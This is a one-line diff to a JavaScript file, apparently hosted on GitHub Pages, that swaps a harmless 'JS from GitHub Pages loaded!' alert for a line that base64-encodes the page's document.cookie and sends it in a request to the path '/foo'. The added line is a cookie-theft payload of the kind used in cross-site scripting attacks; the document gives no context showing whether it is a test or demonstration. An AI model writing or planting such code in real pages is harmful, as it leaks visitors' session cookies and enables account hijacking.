@@ -1,1 +1,1 @@
-alert("JS from GitHub Pages loaded!");
+fetch("/foo?"+window.btoa(document.cookie))
